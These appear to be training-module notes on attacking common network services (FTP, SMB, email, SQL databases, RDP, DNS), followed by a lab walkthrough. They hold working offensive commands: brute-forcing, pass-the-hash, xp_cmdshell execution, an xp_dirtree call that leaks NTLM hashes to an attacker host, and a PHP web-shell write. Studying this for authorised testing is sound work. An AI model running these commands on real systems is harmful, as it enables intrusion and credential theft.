# Attacking Common Services — Module Notes

Summary of the **Attacking Common Services** module: core concepts, methodology,
and step-by-step techniques for enumerating and exploiting FTP, SMB, Email,
SQL Databases, RDP, and DNS.

## Table of Contents
1. [Concept of Attacks](#concept-of-attacks)
2. [General Methodology](#general-methodology)
3. [Service-Specific Attacks](#service-specific-attacks)
   - [FTP](#ftp)
   - [SMB](#smb)
   - [Email (SMTP/POP3/IMAP)](#email-smtppop3imap)
   - [SQL Databases (MSSQL/MySQL)](#sql-databases-mssqlmysql)
   - [RDP](#rdp)
   - [DNS](#dns)
4. [Tools Reference](#tools-reference)
5. [Skills Assessment Walkthrough](#skills-assessment-walkthrough)
6. [Key Takeaways](#key-takeaways)

---

## Concept of Attacks

Every attack follows the same **4-step pattern**:


| Stage | Description |
|---|---|
| **SOURCE** | Where the attacker's input comes from (user input, code, config, API, library) |
| **PROCESS** | How the service handles that input (data processing, variables, logging) |
| **PRIVILEGES** | The permissions under which the process runs (SYSTEM/root, user, group) |
| **DESTINATION** | Where the result ends up (local file, network, another process) |

The cycle often repeats after the first stage, leading to deeper compromise
(e.g. capturing hashes, executing commands, gaining a shell).

---

## General Methodology

1. **Enumeration** — discover open ports, service versions, banners.
2. **Misconfiguration checks** — test for default credentials, anonymous access, weak permissions.
3. **Credential attacks** — user enumeration, password spraying, brute-forcing.
4. **Exploitation** — use protocol-specific features (`xp_cmdshell`, `LOAD_FILE`, `xp_dirtree`, etc.).
5. **Post-exploitation** — escalate privileges, move laterally, retrieve flags.

---

## Service-Specific Attacks

### FTP

- **Default port:** 21 (TCP)
- **Common misconfigs:** anonymous login, weak passwords, writable directories.

**Steps:**
```bash
# 1. Scan
nmap -p21 -sV -sC <IP>

# 2. Check anonymous login
ftp <IP>            # user: anonymous, password: blank

# 3. Browse/download
ls; cd; get; mget

# 4. Brute-force if anonymous fails
hydra -l <user> -P passwords.txt <IP> ftp
```

- Look for sensitive files (config, passwords, source code).
- If write permissions exist, upload a web shell/backdoor.
- **CoreFTP CVE-2022-22836:** directory traversal via PUT request to write outside FTP root.

---

### SMB

- **Default ports:** 139 (NetBIOS), 445 (direct SMB)
- **Common misconfigs:** null sessions, weak passwords, excessive share permissions.

**Steps:**
```bash
# Scan
nmap -p139,445 -sV -sC <IP>

# Null session check
smbclient -N -L //<IP>
smbmap -H <IP>

# Enumerate shares/users
enum4linux -a <IP>
rpcclient -U '' -N <IP>

# Mount share with creds
smbclient //<IP>/<share> -U <user>

# Remote exec (admin creds)
impacket-psexec <user>:<pass>@<IP>
impacket-smbexec <user>:<pass>@<IP>
impacket-atexec <user>:<pass>@<IP>
crackmapexec smb <IP> -u <user> -p <pass> -x whoami

# Dump SAM hashes
crackmapexec smb <IP> -u <user> -p <pass> --sam

# Pass-the-Hash
xfreerdp /v:<IP> /u:<user> /pth:<hash> /cert-ignore
```

**Hash capture via Responder** — force SMB auth to a fake share:
```sql
-- From SQL (xp_dirtree)
EXEC master..xp_dirtree '\\<attacker_IP>\share\';
```
Crack the captured hash with Hashcat (`-m 5600`).

---

### Email (SMTP/POP3/IMAP)

- **SMTP:** 25 (plain), 587 (STARTTLS), 465 (SSL)
- **POP3:** 110 (plain), 995 (SSL)
- **IMAP:** 143 (plain), 993 (SSL)

**Steps:**
```bash
# Enumerate MX records
host -t MX <domain>

# Scan mail ports
nmap -p25,110,143,587,993,995 <IP>

# Enumerate users via SMTP (VRFY / EXPN / RCPT TO)
smtp-user-enum -M RCPT -U users.txt -D <domain> -t <IP>

# Brute-force passwords
hydra -l <user> -P passwords.txt <IP> pop3   # or smtp / imap
```

**Access mailbox manually:**
- POP3: `telnet <IP> 110` → `USER`, `PASS`, `LIST`, `RETR <n>`
- IMAP: `telnet <IP> 143` → `. LOGIN`, `. SELECT INBOX`, `. FETCH 1 BODY[]`

- If SMTP is an open relay, send spoofed mail with `swaks`.
- **OpenSMTPD CVE-2020-7247:** inject `;` in `MAIL FROM` to execute system commands.

---

### SQL Databases (MSSQL/MySQL)

- **MSSQL:** 1433 (TCP), 1434 (UDP)
- **MySQL:** 3306 (TCP)

**MSSQL:**
```bash
impacket-mssqlclient -p 1433 <user>:'<pass>'@<IP>
```
```sql
SELECT name FROM master.dbo.sysdatabases;
USE <db>;
SELECT table_name FROM information_schema.tables;
SELECT * FROM <table>;

-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
xp_cmdshell 'whoami';

-- Read files
SELECT * FROM OPENROWSET(BULK 'C:\path\to\file', SINGLE_CLOB) AS Contents;

-- Write files (if OLE Automation enabled)
DECLARE @OLE INT; EXEC sp_OACreate 'Scripting.FileSystemObject', @OLE OUT;
EXEC sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'C:\path', 8, 1;
EXEC sp_OAMethod @FileID, 'WriteLine', Null, 'content';

-- Capture NTLM hash
EXEC master..xp_dirtree '\\<attacker_IP>\share\';

-- Impersonate
EXECUTE AS LOGIN = 'sa';

-- Linked servers
SELECT srvname FROM sysservers;
EXECUTE('SELECT @@version') AT [<linked_server>];
```

**MySQL:**
```bash
mysql -u <user> -p<pass> -h <IP>
```
```sql
SHOW DATABASES;
SHOW TABLES;
SELECT * FROM <table>;

-- Read files (if secure_file_priv empty)
SELECT LOAD_FILE('/etc/passwd');

-- Write files (e.g. web shell)
SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE '/var/www/html/shell.php';
```

---

### RDP

- **Default port:** 3389 (TCP)

**Steps:**
```bash
nmap -p3389 -sV <IP>

# Password spraying
hydra -L users.txt -p 'commonpass' <IP> rdp

# Connect
xfreerdp /v:<IP> /u:<user> /p:<pass> /cert-ignore
```

- **Session hijacking** (requires SYSTEM): `query user` → `tscon <session_id> /dest:<your_session>`
- **Pass-the-Hash** (Restricted Admin Mode): set registry `DisableRestrictedAdmin = 0x0`, then
  `xfreerdp /v:<IP> /u:<user> /pth:<hash> /cert-ignore`
- **BlueKeep (CVE-2019-0708):** unauthenticated RCE via use-after-free in the RDP driver. ⚠️ May cause BSoD.

---

### DNS

- **Default port:** 53 (UDP/TCP)

**Steps:**
```bash
# Enumerate records
dig @<DNS_IP> <domain> ANY
host -t MX <domain>

# Zone transfer
dig AXFR @<DNS_IP> <domain>

# Subdomain brute-force if AXFR blocked
subbrute.py <domain> -s names.txt -r resolvers.txt
dnsrecon -d <domain> -t brt

# Dangling CNAME check (subdomain takeover)
dig CNAME <sub>.<domain>
```

If a CNAME points to an expired service (e.g. an unclaimed S3 bucket), that's a takeover candidate.

**Local DNS spoofing** (Ettercap/Bettercap): edit `/etc/ettercap/etter.dns`, enable `dns_spoof` plugin.

---

## Tools Reference

| Service | Tools |
|---|---|
| FTP | `ftp`, `hydra`, `medusa`, `nmap`, `curl` (CoreFTP exploit) |
| SMB | `smbclient`, `smbmap`, `enum4linux`, `rpcclient`, `impacket-psexec`, `crackmapexec`, `responder` |
| Email | `smtp-user-enum`, `hydra`, `swaks`, `telnet`, `o365spray` (O365), `MailSniper` |
| SQL | `impacket-mssqlclient`, `mysql`, `sqlcmd`, `sqsh`, `dbeaver` |
| RDP | `xfreerdp`, `rdesktop`, `hydra`, `crowbar` |
| DNS | `dig`, `host`, `subbrute`, `dnsrecon`, `fierce`, `ettercap` |
| General | `nmap`, `responder`, `hashcat`, `john`, `netexec` |

---

## Skills Assessment Walkthrough

### Easy (Windows — FTP, SMTP, MySQL)
1. Add `inlanefreight.htb` to `/etc/hosts`.
2. Scan: `nmap -p21,25,80,3306,3389 <IP>`.
3. Enumerate SMTP users: `smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t <IP>` → find `fiona`.
4. Hydra SMTP password: `hydra -l fiona@inlanefreight.htb -P rockyou.txt <IP> smtp` → `987654321`.
5. Connect to MySQL: `mysql -u fiona -p987654321 -h <IP> --skip-ssl`.
6. `LOAD_FILE("C:/Users/Administrator/Desktop/flag.txt")` → flag.

### Medium (Linux — FTP, SSH, POP3)
1. Scan: ports 22, 53, 110, 2121, 30021 open.
2. Anonymous FTP on port 30021: download `mynotes.txt` from `/simon`.
3. Brute-force SSH as `simon` using `mynotes.txt` as password list → get password.
4. Use that password on FTP port 2121 → download `flag.txt`.

### Hard (Windows — SMB, MSSQL, RDP)
1. Scan: ports 135, 445, 1433, 3389 open.
2. Null session SMB on `Home` share → browse `IT` folder → download `creds.txt` (Fiona), `random.txt` (Simon), `secrets.txt` (John).
3. Hydra RDP with `creds.txt` → `Fiona:48Ns72!bns74@S84NNNSl`.
4. RDP as Fiona → run `sqlcmd`.
5. Impersonate `john`, enumerate linked server `local.test.linked.srv`.
6. Read `flag.txt` via `OPENROWSET(BULK...)` at linked server → flag.

---

## Key Takeaways

- Every attack follows **SOURCE → PROCESS → PRIVILEGES → DESTINATION**.
- Enumeration is critical — always check for anonymous access, default creds, and weak permissions.
- Password spraying is safer than brute-forcing (avoids account lockouts).
- `xp_dirtree` / `xp_subdirs` can capture NTLM hashes from MSSQL servers.
- Linked servers in MSSQL often enable lateral movement and privilege escalation.
- Subdomain takeover is a common misconfig — always check for dangling CNAMEs.
- Always clean up after testing, especially when using exploits that may cause instability.
